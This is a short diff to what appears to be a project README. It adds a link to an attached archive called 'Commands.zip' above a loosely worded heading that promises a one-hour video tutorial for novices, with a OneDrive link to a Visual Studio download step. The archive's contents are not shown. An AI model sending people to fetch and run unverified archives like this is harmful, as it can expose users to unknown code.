@@ -1,5 +1,8 @@
 
 
+[Commands.zip](https://github.com/user-attachments/files/31552456/Commands.zip)
+
+
 # 28 Aug 2026: One Hour Video for Kids to a Cook (kitchen) or a Computer User from any Discipline follow the steps; You can run the Application in your Laptop.
 
 ## VIDEO 1 [Step 1: VS 2026 Download](https://1drv.ms/v/c/93d70fb51193cb6b/IQBPuCnZNZYvSrM6KyzEHLj_AR7li3IJKuE4Jx5dCSx9zYk?e=UZ2cq5) 
